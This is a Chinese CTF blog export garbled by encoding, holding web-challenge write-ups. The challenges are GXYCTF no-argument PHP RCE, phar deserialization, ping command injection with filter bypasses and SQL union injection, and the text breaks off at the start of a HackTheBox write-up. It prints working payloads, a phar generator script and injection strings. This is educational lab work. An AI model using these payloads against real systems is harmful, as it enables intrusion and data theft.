$_GET['exp'])) &#123; if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) &#123; if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) &#123; // echo $_GET['exp']; @eval($_GET['exp']); &#125; else&#123; die(\"è¿˜å·®ä¸€ç‚¹å“¦ï¼\"); &#125; &#125; else&#123; die(\"å†å¥½å¥½æƒ³æƒ³ï¼\"); &#125; &#125; else&#123; die(\"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼\"); &#125;&#125;// highlight_file(__FILE__);?&gt; åˆ°è¿™å°±å¯ä»¥ç¡®è®¤æ˜¯æ— å‚RCEäº†ï¼Œé‚£ä¹ˆç°åœ¨æ¥å°ç»“ä¸‹å¦‚ä½•åº”å¯¹æ— å‚RCEä»¥åŠå¦‚ä½•è¿‡è¿™é‡Œçš„æ­£åˆ™ï¼šé¦–å…ˆæ˜ç¡®ä¸€ç‚¹ï¼ŒåŸºäºæ— å‚RCEçš„æ ¼å¼è¦æ±‚ï¼Œæˆ‘ä»¬å¯åˆ©ç”¨çš„æœ‰å¾ˆå¤šï¼Œå…¶ä¸­ä¸»è¦åŒ…æ‹¬å…¨å±€å˜é‡ä»¥åŠè¿”å›å€¼æœ‰ç‰¹æ®Šæ€§çš„å‡½æ•°ã€‚ç”šè‡³å¯ä»¥åƒskyé‚£æ ·ï¼Œé€šè¿‡getallheaders()æ‹¿åˆ°ç¯å¢ƒå˜é‡ï¼Œä½¿è‡ªå·±ä¼ å‚çš„å‚æ•°å˜ä¸ºå¯æ§çš„ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ã€‚é‚£ä¹ˆå›åˆ°é¢˜ç›®ä¸Šï¼Œç°åœ¨è‚¯å®šç¬¬ä¸€æ­¥æ˜¯çœ‹çœ‹ç›®å½•äº†ï¼Œä»skyé‚£å­¦åˆ°çš„å¸¸è§„æ‰‹æ³•ï¼Œæ˜¯getcwd()è·å¾—å½“å‰ç›®å½•ï¼Œscandir(getcwd())è·å¾—å½“å‰ç›®å½•çš„æ–‡ä»¶ã€‚è€Œå¦‚æœè¦å¾€ä¸Šå±‚ç›®å½•çœ‹çš„è¯ï¼Œå°±åˆ©ç”¨dirname()ï¼Œä½¿ç”¨scandir(dirname(getcwd()))ã€‚ä¸è¿‡è¿™é‡Œæˆ‘è¯•äº†ä¸‹å¥½åƒä¸å¤ªè¡Œï¼Œæ‰€ä»¥æ”¹ç”¨å…¶ä»–æ–¹æ³•ï¼šæˆ‘ä»¬çŸ¥é“ï¼Œscandir()è¯»å½“å‰ç›®å½•çš„ç”¨æ³•æ˜¯scandir(â€˜.â€™),ä½†è¿™é‡Œçš„â€™.â€™è¦æ€ä¹ˆè·å¾—å‘¢ï¼Ÿé‚£å°±è¦æ¶‰åŠåˆ°ä¸€ä¸ªé«˜çº§ç”¨æ³• 1current(localeconv()) æœ¬åœ°è¯•ä¸€ä¸‹ç»“æœï¼šåè€…ä¹‹è¿”å›ä¸€ä¸ªç‚¹ï¼Œæ˜¯å®Œå…¨å¯ä»¥åˆ©ç”¨äº†ã€‚æ‰«ç›®å½• 1print_r(scandir(current(localeconv()))); é‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦è¯»flag.phpäº†ï¼Œè¿™é‡Œæˆ‘ä»¬å½“ç„¶åªèƒ½åˆ©ç”¨flag.phpåœ¨è¿”å›çš„æ•°ç»„ä¸­çš„é”®å€¼æ¥æ“ä½œä¸‹ã€‚å¦‚æœflag.phpæ˜¯æ•°ç»„æœ€åä¸€ä¸ªæ•°å€¼çš„è¯ï¼Œç›´æ¥end()å°±è§£å†³äº†ã€‚ä¸è¿‡è¿™é‡Œæ˜¯å€’æ•°ç¬¬äºŒä¸ªï¼Œæ‰€ä»¥æœ‰å…¶ä»–æ–¹æ³•æ“ä½œï¼š1.è¿æ°”æ³•hhhå› ä¸ºæ˜¯é éšæœºæ•°ï¼Œæˆ‘è®¤ä¸ºå¹²è„†å«è¿æ°”ä½¿ç„¶å¥½äº†ã€‚ 1array_rand(array_flip(scandir(current(localeconv())))) è¿™é‡Œarray_rand()ä¸å¤šè¯´ï¼Œå°±æ˜¯éšæœºè·å¾—æ•°ç»„ä¸­ä¸€ä¸ªä¸‹æ ‡ï¼Œè€Œarray_flipåˆ™å¯ä»¥äº¤æ¢é”®ä¸å€¼ã€‚é‚£ä¹ˆè¿”å›çš„å°±å˜æˆå€¼äº†ã€‚å› ä¸ºè¿™é‡Œåªæœ‰äº”ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨éšæœºæ•°å®Œå…¨ä¸ç”¨å…³å¿ƒå…¶éšæœºæ€§ã€‚ 2.ä½¿ç”¨array_reverseåŠ ä¸Šnext()ï¼ŒæŠŠæ•°ç»„é€†è¿‡æ¥åï¼Œflag.phpå˜æˆç¬¬äºŒä¸ªå…ƒç´ ï¼Œæ°å·§æ˜¯æ•°ç»„åæŒ‡é’ˆä¸‹ä¸€ä¸ªï¼Œä½¿ç”¨next()å³å¯ã€‚ æœ€åï¼Œä½¿ç”¨readfile()æˆ–highlight_fileè¯»æ–‡ä»¶å³å¯payload: 1exp=print_r(readfile(array_rand(array_flip(scandir(current(localeconv())))))); BabySqli v3.0pharååºåˆ—åŒ–çš„é¢˜ç›®ã€‚å…¶å®ä»å»å¹´10æœˆä»½åˆ°ç°åœ¨è‡ªå·±å·²ç»å¬è¿‡æ— æ•°æ¬¡pharååºåˆ—åŒ–çš„æ¼æ´äº†ï¼Œè€Œä¸”å­¦æ ¡é‡Œå¸ˆå‚…ä»¬ä¹Ÿä¸€ç›´åœ¨æ•´ç›¸å…³çš„popé“¾ä»€ä¹ˆçš„ï¼Œå› æ­¤å¯’å‡ä¸€å®šè¦è§£å†³è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼ˆå¥½åƒå·²ç»æ¬ äº†ä¸å°‘çŸ¥è¯†â€¦â€¦ssrfä»å»å¹´8æœˆåˆ°ç°åœ¨è¿˜æ²¡æœ‰ç³»ç»Ÿçš„å¥½å¥½å­¦è¿‡â€¦â€¦ï¼‰ è¿™é“é¢˜ä¹Ÿç®—æ˜¯è‡ªå·±çš„ç¬¬ä¸€é“pharååºåˆ—åŒ–çš„é¢˜ç›®å§ï¼Œæ•´ä½“ä¸ç®—éš¾ã€‚ä¸è¿‡æ¯”èµ›æ—¶çš„å¸ˆå‚…ä»¬å¯èƒ½ä¸è¿™ä¹ˆæƒ³ï¼Œå› ä¸ºè¿™é“é¢˜çš„åå­—å®¹æ˜“æŠŠäººå¼•å‘sqlæ³¨å…¥ä¸Šï¼Œä½†å…¶å®ç™»å½•ç•Œé¢å°±æ˜¯ä¸ªå¼±å£ä»¤admin passwordã€‚ä¼°è®¡å‘äº†ä¸å°‘äººå§ã€‚ ç™»å½•è¿›å»åï¼Œçœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ (ç°åœ¨çš„æ–‡ä»¶ä¸Šä¼ é¢˜å¾ˆå¤šå°±æ˜¯pharçš„çŸ¥è¯†ç‚¹ï¼Œæ¯”å¦‚çº¢å¸½æ¯) åŒæ—¶æ³¨æ„åˆ°æœ‰fileå‚æ•°ä¸ºuploadï¼Œå¯èƒ½æ˜¯ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹ã€‚å› æ­¤æˆ‘ä»¬å°è¯•ä¸€ä¸‹è®¿é—®ï¼Œå‘ç°ç¡®å®å­˜åœ¨upload.php.åŒç†ï¼Œå¯ä»¥ç¡®è®¤æœ‰flag.phpã€‚ä½†æ˜¾ç„¶è¢«banäº†ã€‚å› æ­¤å†å›åˆ°fileå‚æ•°ä¸Šï¼Œé™¤äº†ç›´æ¥çš„æ–‡ä»¶åŒ…å«ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨ä¼ªåè®®è¯•è¯•ï¼Œäºæ˜¯æˆåŠŸæ‹¿åˆ°home.phpæºç ã€‚è§£ç åå¾—ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?phperror_reporting(0);class Uploader&#123; public $Filename; public $cmd; public $token; function __construct()&#123; $sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\"; $ext = \".txt\"; @mkdir($sandbox, 0777, true); if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name']))&#123; $this-&gt;Filename = $_GET['name']; &#125; else&#123; $this-&gt;Filename = $sandbox.$_SESSION['user'].$ext; &#125; $this-&gt;cmd = \"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';\"; $this-&gt;token = $_SESSION['user']; &#125; function upload($file)&#123; global $sandbox; global $ext; if(preg_match(\"[^a-z0-9]\", $this-&gt;Filename))&#123; $this-&gt;cmd = \"die('illegal filename!');\"; &#125; else&#123; if($file['size'] &gt; 1024)&#123; $this-&gt;cmd = \"die('you are too big (â€²â–½`ã€ƒ)');\"; &#125; else&#123; $this-&gt;cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this-&gt;Filename . \"');\"; &#125; &#125; &#125; function __toString()&#123; global $sandbox; global $ext; // return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; &#125; function __destruct()&#123; if($this-&gt;token != $_SESSION['user'])&#123; $this-&gt;cmd = \"die('check token falied!');\"; &#125; eval($this-&gt;cmd); &#125;&#125;if(isset($_FILES['file'])) &#123; $uploader = new Uploader(); $uploader-&gt;upload($_FILES[\"file\"]); if(@file_get_contents($uploader))&#123; echo \"ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;\".$uploader.\"&lt;br&gt;\"; echo file_get_contents($uploader); &#125;&#125;?&gt; åˆ°è¿™é‡Œå°±æœ‰ç‚¹ä»¥å‰ååºåˆ—åŒ–çš„æ„æ€äº†ï¼Œè€Œä¹‹æ‰€ä»¥é¢˜ç›®æ˜¯pharååºåˆ—åŒ–ï¼Œå°±æ˜¯å› ä¸ºpharçš„ä¼˜åŠ¿å°±åœ¨äºå¯ä»¥åœ¨ä¼ªé€ æ–‡ä»¶ç±»å‹çš„åŒæ—¶åˆ©ç”¨phar://æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚é‚£æˆ‘ä»¬ç›´æ¥çœ‹çœ‹è¦å¦‚ä½•åˆ©ç”¨ï¼šé¦–å…ˆæ˜¯æ‰¾å¯æ§å‚æ•°ï¼Œæˆ‘ä»¬æ‰¾åˆ°nameå‚æ•°æ˜¯é€šè¿‡getä¼ çš„ï¼š 1$this-&gt;Filename = $_GET['name']; ä¹‹ååœ¨æ‰¾å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ç‚¹ 123456function __destruct()&#123; if($this-&gt;token != $_SESSION['user'])&#123; $this-&gt;cmd = \"die('check token falied!');\"; &#125; eval($this-&gt;cmd); &#125; åªè¦ä¿è¯tokenæ˜¯ä¸userçš„sessionç›¸åŒå³å¯evalæ‰§è¡Œå‘½ä»¤ã€‚é‚£ä¹ˆåŒæ—¶æˆ‘ä»¬å®ä¾‹åŒ–çš„å¯¹è±¡$uploaderåœ¨_toStringæ–¹æ³•ä¸­çœ‹åˆ°ï¼Œè¿”å›å€¼æ˜¯filename,ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„nameçš„å€¼ã€‚é‚£æˆ‘ä»¬åªè¦è®©æœ€åçš„file_get_contents()æ‰§è¡Œæ—¶è¯»æˆ‘ä»¬å¯æ§çš„flag.phpå°±å¥½äº†ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå…ˆéšä¾¿ä¼ ä¸€ä¸ªæ–‡ä»¶ç¡®å®šä¸‹æç¤ºæˆ‘ä»¬çš„æ–‡ä»¶ä½ç½®ï¼Œç¡®è®¤token,ç„¶åæœ¬åœ°ç”Ÿæˆpharæ–‡ä»¶ 1234567891011121314151617181920212223&lt;?phpclass Uploader&#123; public $Filename; public $cmd; public $token;&#125;$o=new Uploader();$o-&gt;cmd='highlight_file(\"/var/www/html/flag.php)';$o-&gt;Filename='test';$o-&gt;token='GXYbef648df4f254d89810fd44f9a2fc822';echo serialize($o);$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\");//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-&gt;stopBuffering();?&gt; ä¸Šä¼ pharåï¼Œnameå‚æ•°èµ‹å€¼phar://+ä¸Šä¼ pharæ–‡ä»¶çš„åœ°å€å†éšä¾¿ä¸Šä¼ æ–‡ä»¶å°±å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ï¼Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€‚ å…¶å®å› ä¸ºå‡ºé¢˜äººå¤šæ‰“äº†ä¸€ä¸ªç©ºæ ¼ï¼Œå¯¼è‡´æ­£åˆ™åŒ¹é…æ²¡æ•ˆæœâ€¦â€¦ç›´æ¥ä¼ ä¸€å¥è¯æˆ–è€…ç›´æ¥åŒ…å«flag.phpåä¼ æ–‡ä»¶éƒ½å¯ä»¥æ‹¿flagâ€¦â€¦ GXYçš„é¢˜å°±å…ˆå‘Šä¸€æ®µè½å§ï¼Œæ˜å¤©è¿˜è¦åšåšä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œä¹‹åè¦æŠŠåŸºç¡€æ¼æ´ç›¸å…³çŸ¥è¯†éƒ½äº†è§£é€å½»ï¼Œæ¯•ç«Ÿè‡ªå·±åº•å­ä¸ç‰¢ã€‚ç„¶åæŠŠæ¬ ç€çš„ssrf,pharç­‰ç­‰éƒ½ç³»ç»Ÿå­¦ä¸€å­¦åº”è¯¥å°±å¥½äº†","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"GXYCTF--PingPingPing&BabySqli","slug":"GXYCTF-PingPingPing-BabySqli","date":"2020-01-13T09:31:00.000Z","updated":"2021-02-18T05:09:06.776Z","comments":true,"path":"2020/01/13/GXYCTF-PingPingPing-BabySqli/","link":"","permalink":"https://www.bycsec.top/2020/01/13/GXYCTF-PingPingPing-BabySqli/","excerpt":"è¯´æ¥æƒ­æ„§ï¼Œä¹‹å‰12æœˆä»½åˆæŠ¥äº†GWYCTF,ç»“æœåˆ°äº†æ¯”èµ›çš„æ—¶å€™åˆå› ä¸ºå¤ä¹ å¿™çš„ç„¦å¤´çƒ‚é¢ï¼Œæ‰€ä»¥ä¸€é“é¢˜ç›®éƒ½æ²¡çœ‹ã€‚åˆšå¥½å› ä¸ºé¢˜ç›®éš¾åº¦æ˜¯é’ˆå¯¹æ ¡å†…æ‹›æ–°çš„ï¼Œæˆ‘å°±ç°åœ¨å¤ç°ä¸‹å§ï¼šé¢˜ç›®å¤ç°åœ°å€ï¼šhttps://buuoj.cn/å¤§ä½¬ä»¬åœ¨å„ç§æ¯”èµ›ç¾¤é‡Œåº”è¯¥å·²ç»çŸ¥é“äº†è¿™ä¸ªå¹³å°çš„å­˜åœ¨äº†ï¼Œæœ‰ä¸€è¯´ä¸€é‚£ä½å¸ˆå‚…æ˜¯çœŸçš„å¯Œâ€¦â€¦è¿˜æ˜¯è¦æ„Ÿè°¢buuoj.cnæä¾›äº†ä¸€ä¸ªå¤ç°è¿™äº›å¹´å¤§èµ›é¢˜ç›®çš„æœºä¼šã€‚","text":"è¯´æ¥æƒ­æ„§ï¼Œä¹‹å‰12æœˆä»½åˆæŠ¥äº†GWYCTF,ç»“æœåˆ°äº†æ¯”èµ›çš„æ—¶å€™åˆå› ä¸ºå¤ä¹ å¿™çš„ç„¦å¤´çƒ‚é¢ï¼Œæ‰€ä»¥ä¸€é“é¢˜ç›®éƒ½æ²¡çœ‹ã€‚åˆšå¥½å› ä¸ºé¢˜ç›®éš¾åº¦æ˜¯é’ˆå¯¹æ ¡å†…æ‹›æ–°çš„ï¼Œæˆ‘å°±ç°åœ¨å¤ç°ä¸‹å§ï¼šé¢˜ç›®å¤ç°åœ°å€ï¼šhttps://buuoj.cn/å¤§ä½¬ä»¬åœ¨å„ç§æ¯”èµ›ç¾¤é‡Œåº”è¯¥å·²ç»çŸ¥é“äº†è¿™ä¸ªå¹³å°çš„å­˜åœ¨äº†ï¼Œæœ‰ä¸€è¯´ä¸€é‚£ä½å¸ˆå‚…æ˜¯çœŸçš„å¯Œâ€¦â€¦è¿˜æ˜¯è¦æ„Ÿè°¢buuoj.cnæä¾›äº†ä¸€ä¸ªå¤ç°è¿™äº›å¹´å¤§èµ›é¢˜ç›®çš„æœºä¼šã€‚ Ping Ping Pingå¼€å§‹è¿›å…¥æç¤ºä¼ å‚ip,åŸé¢˜åº”è¯¥æ˜¯ç›´æ¥ç»™äº†ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥åå‘ç°æœ‰æ‰§è¡Œpingå‘½ä»¤çš„æ•ˆæœé‚£ä¹ˆçœ‹æ¥æ˜¯å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®äº†ï¼Œå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å¤§æŠµæ˜¯åŠ ä¸Šç®¡é“ç¬¦æˆ–è€…åˆ†å·ï¼Œé‚£ä¹ˆè¯•è¯•ç®¡é“ç¬¦å°è¯•è¯»flagå‘ç°æœç„¶è¢«banäº†ï¼Œé‚£ä¹ˆè¯•è¯•index.phpå‘ç°æç¤ºç©ºæ ¼è¢«banäº†ã€‚ç»•è¿‡ç©ºæ ¼çš„æ–¹æ³•å¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§ï¼š 12345678$IFS$&#123;IFS&#125;$IFS$1 &#x2F;&#x2F;$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ&lt; &lt;&gt; &#123;cat,flag.php&#125; &#x2F;&#x2F;ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½%20 %09 ä¸å¦¨å°±ç”¨ $IFSè¯•è¯•ï¼Œæ— æœï¼Œç”¨${IFS}å‘ç°{}è¢«banã€‚å†è¯•$IFS$1æˆåŠŸã€‚æºç å¦‚ä¸‹ï¼š 123456789101112131415161718/?ip=|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match))&#123; echo preg_match(\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match); die(\"fxck your symbol!\"); &#125; else if(preg_match(\"/ /\", $ip))&#123; die(\"fxck your space!\"); &#125; else if(preg_match(\"/bash/\", $ip))&#123; die(\"fxck your bash!\"); &#125; else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip))&#123; die(\"fxck your flag!\"); &#125; $a = shell_exec(\"ping -c 4 \".$ip); echo \"\"; print_r($a);&#125;?&gt; è¿‡æ»¤äº†è®¸å¤šæ ‡ç‚¹ï¼Œç©ºæ ¼ï¼Œbash,åŒ…æ‹¬flagçš„è´ªå©ªåŒ¹é…ã€‚é‚£ä¹ˆè‡ªå·±å°è±¡ä¸­å‡ ç§åšæ³•ï¼š 12341.cat fl* åˆ©ç”¨*åŒ¹é…ä»»æ„ ä¸è¡Œ2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash ä¹Ÿä¸è¡Œ3.ca\\t fl\\ag.php ä¸è¡Œ4.cat fl&#39;&#39;ag.php ä¸è¡Œ é‚£ä¹ˆå¦‚ä½•è§£å†³å‘¢ï¼Ÿå…¶å®è¿˜æœ‰ä¸€ç§æ¯”è¾ƒå¸¸è§çš„åšæ³•æ²¡æœ‰æåŠï¼Œé‚£å°±æ˜¯å˜é‡æ‹¼æ¥ï¼šä¹‹å‰è‡ªå·±ç‰¹åˆ«å–œæ¬¢ç”¨çš„ä¸€å¥è¯æœ¨é©¬æ‹†å¼€ç”¨ä¹Ÿæ˜¯è¿™ä¸ªé“ç†ã€‚ æ­£å¥½ï¼Œæˆ‘ä»¬çœ‹åˆ°æºç ä¸­æœ‰ä¸€ä¸ª$aå˜é‡å¯ä»¥è¦†ç›–ï¼Œé‚£ä¹ˆpayloadå°±å‡ºæ¥äº†ï¼š 1&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php ç„¶åæœ‰å®˜æ–¹ä¸å…¶ä»–å¤§ä½¬çš„é«˜ç«¯è§£æ³•ï¼šå®˜æ–¹ï¼š 1echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh è¿‡æ»¤bash?é‚£å°±ç”¨shã€‚shçš„å¤§éƒ¨åˆ†è„šæœ¬éƒ½å¯ä»¥åœ¨bashä¸‹è¿è¡Œã€‚ dalaoå†…è”æ‰§è¡Œçš„åšæ³•ï¼Œåªèƒ½è¯´V&amp;Nçš„å¸ˆå‚…ä»¬å¤ªå¼ºäº†ã€‚ 1http:&#x2F;&#x2F;530bbcaf-9d64-494e-8993-bb3727c31a5a.node3.buuoj.cn&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96; å†…è”ï¼Œå°±æ˜¯å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œã€‚ç§’é¢˜å¤§æ¦‚å°±æ˜¯è¿™ç§åšæ³•å§â€¦â€¦ BabySqliè¿›å»åä¸€ä¸ªè´¦å·ï¼Œå¯†ç è¾“å…¥æ¡†ã€‚å…ˆéšä¾¿è¾“ä¸‹ï¼Œæç¤ºwrong passã€‚ä½†æ˜¯çœ‹æºç æœ‰æ„å¤–æ”¶è·ä»å½¢å¼ä¸Šçœ‹æ•°å­—æˆåˆ†éƒ½æ²¡æœ‰è¶…è¿‡6,å¯èƒ½æ˜¯base32ï¼Œè§£ç åå¾—åˆ°ä¸€ä¸ªbase64ç¼–ç ï¼Œè§£ç åå¾—åˆ°ä»¥ä¸‹: 1select * from user where username &#x3D; &#39;$name&#39; é‚£ä¹ˆå°±å¯ä»¥åœ¨usernameè¿™ä¸ªæ³¨å…¥ç‚¹ä¸‹æ‰‹å¤„ç†äº†ã€‚è¿™é“é¢˜ç›®åªè¿‡æ»¤äº†åŸºæœ¬çš„andä¸ç­‰å·è¿˜æ˜¯å¾ˆèƒ½æ“ä½œçš„ã€‚ä¸è¿‡åæ¥çœ‹åˆ«äººè¯´è¿™é¢˜è€ƒç‚¹åœ¨MD5æŸ¥è¯¢ç»•è¿‡ã€‚è¿™ä¹ˆè¯´çš„åŸå› æ˜¯ï¼Œå°±ç®—æˆåŠŸæ³¨å…¥æŠŠadminå¯†ç çš„MD5æ‹¿åˆ°ï¼Œå› ä¸ºè§£ä¸äº†çš„ç¼˜æ•…ç­‰äºæ²¡ç”¨ã€‚åŸºäºé¢˜ç›®æç¤ºçš„wrong passï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯ç›´æ¥æ‹¿è¾“å…¥å¯†ç çš„MD5æ•°å€¼è·Ÿæ•°æ®åº“é‡Œå·²çŸ¥å€¼æ¯”è¾ƒã€‚ ç¨å¾®FUZZä¸€ä¸‹admin&#39; union select 1,2,3å¯ä»¥ç¡®è®¤æœ‰ä¸‰ä¸ªå­—æ®µåé¢ç¡®è®¤å¤§æ¦‚æ˜¯id,adminï¼Œpasswdä¸‰ä¸ªå­—æ®µã€‚è¿™é‡Œä¸ºäº†ç»•è¿‡ï¼Œéœ€è¦ä¿è¯æˆ‘ä»¬çš„æŸ¥è¯¢ç»“æ„ä¸€è‡´ï¼Œå°±å¯ç›´æ¥select æƒ³è¦çš„è¿”å›å€¼ã€‚é‚£ä¹ˆæ„é€ ä¸€ä¸ªä¸ºå‡çš„æŸ¥è¯¢-1ï¼Œåé¢æ¥ä¸Šè”åˆæŸ¥è¯¢ï¼š 1-1&#39; union select 1,&#39;admin&#39;,&#39;7363a0d0604902af7b70b271a0b96480&#39;# å¯†ç è¾“123å³å¯","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"hackthebox-Wall","slug":"hackthebox-Wall","date":"2020-01-12T04:09:00.000Z","updated":"2021-02-18T05:09:30.192Z","comments":true,"path":"2020/01/12/hackthebox-Wall/","link":"","permalink":"https://www.bycsec.top/2020/01/12/hackthebox-Wall/","excerpt":"æ€»ç®—æ˜¯æŒºè¿‡äº†æœŸæœ«12é—¨çš„é­”é¬¼è€ƒè¯•æ—¥ç¨‹ï¼Œè¿æ¥äº†å¯’å‡â€¦â€¦è¿™æ¬¡å¯’å‡æ‰“ç®—å­¦çš„è¿˜æŒºå¤šçš„ï¼Œä¹Ÿå¸Œæœ›è‡ªå·±èƒ½åšæŒå­¦ä¹ ï¼ŒæŠŠçŸ¥è¯†å°½é‡èä¼šè´¯é€šå§ã€‚ä¹‹å‰æ›¾è¯´è¿‡å¸Œæœ›èƒ½æ—©æ—¥æ‹¿ä¸‹è‡ªå·±åœ¨hacktheboxä¸Šçš„ç¬¬ä¸€å°é¶æœºï¼Œæ²¡æƒ³åˆ°è¿™ä¹ˆå¿«å°±åœ¨å¸®åŠ©ä¸‹æ‹¿åˆ°æ‰‹äº†ã€‚å…¶å®åœ¨è¿›å…¥æœŸæœ«å¤ä¹ é˜¶æ®µä¸­çš„ä¸€æ®µæ—¶é—´ï¼Œè‡ªå·±å°±å‚è€ƒyoutubeä¸Šä¸€ä½ä¼˜ç§€çš„hacker youtuberå…³äºhacktheboxçš„è§†é¢‘æˆåŠŸæ‹¿åˆ°äº†é¶æœºï¼Œåªä¸è¿‡ä¸€ç›´æ²¡å†™æ–‡ç« ã€‚è€Œç°åœ¨è¿™å°Wallé¶æœºåœ¨hacktheboxä¸Šä¹Ÿå·²ç»å¤„äºä¸‹æ¶çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘å°±ç®€å•è®°å½•ä¸€ä¸‹æ‹¿ä¸‹Wallçš„è¿‡ç¨‹ï¼Œæ²¡æ³•è´´å®æ“å›¾äº†ã€‚","text":"æ€»ç®—æ˜¯æŒºè¿‡äº†æœŸæœ«12é—¨çš„é­”é¬¼è€ƒè¯•æ—¥ç¨‹ï¼Œè¿æ¥äº†å¯’å‡â€¦â€¦è¿™æ¬¡å¯’å‡æ‰“ç®—å­¦çš„è¿˜æŒºå¤šçš„ï¼Œä¹Ÿå¸Œæœ›è‡ªå·±èƒ½åšæŒå­¦ä¹ ï¼ŒæŠŠçŸ¥è¯†å°½é‡èä¼šè´¯é€šå§ã€‚ä¹‹å‰æ›¾è¯´è¿‡å¸Œæœ›èƒ½æ—©æ—¥æ‹¿ä¸‹è‡ªå·±åœ¨hacktheboxä¸Šçš„ç¬¬ä¸€å°é¶æœºï¼Œæ²¡æƒ³åˆ°è¿™ä¹ˆå¿«å°±åœ¨å¸®åŠ©ä¸‹æ‹¿åˆ°æ‰‹äº†ã€‚å…¶å®åœ¨è¿›å…¥æœŸæœ«å¤ä¹ é˜¶æ®µä¸­çš„ä¸€æ®µæ—¶é—´ï¼Œè‡ªå·±å°±å‚è€ƒyoutubeä¸Šä¸€ä½ä¼˜ç§€çš„hacker youtuberå…³äºhacktheboxçš„è§†é¢‘æˆåŠŸæ‹¿åˆ°äº†é¶æœºï¼Œåªä¸è¿‡ä¸€ç›´æ²¡å†™æ–‡ç« ã€‚è€Œç°åœ¨è¿™å°Wallé¶æœºåœ¨hacktheboxä¸Šä¹Ÿå·²ç»å¤„äºä¸‹æ¶çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘å°±ç®€å•è®°å½•ä¸€ä¸‹æ‹¿ä¸‹Wallçš„è¿‡ç¨‹ï¼Œæ²¡æ³•è´´å®æ“å›¾äº†ã€‚ å‚è€ƒçš„youtuber:IppSec https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQAå¹¸å¥½è‡ªå·±è‹±è¯­æ°´å¹³è¿‡ç¡¬ï¼Œå¯ä»¥å•ƒä»–çš„ç”Ÿè‚‰è§†é¢‘ã€‚æ„Ÿè°¢è¿™ä½å¤§ä½¬ï¼Œç¡®å®å¸®åˆ°äº†æˆ‘å¾ˆå¤šã€‚ æœ¬æœºip:10.10.14.3(ä¹Ÿè®¸å§,è®°ä¸å¾—äº†hhh)é¶æœºip:10.10.10.157 ç„¶åå›é¡¾ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹å§ã€‚é¦–å…ˆç¬¬ä¸€æ­¥å½“ç„¶æ˜¯ä½¿ç”¨hacktheboxæä¾›ç»™æˆ‘ä»¬çš„ovpnè¿æ¥ã€‚è¿™æ ·æˆ‘ä»¬å°±åˆ›å»ºå¥½äº†ä¸é¶æœºä¹‹é—´çš„è™šæ‹Ÿä¸“æœ‰ç½‘ç»œã€‚å¯ä»¥è®¿é—®åˆ°é¢˜ç›®ã€‚ 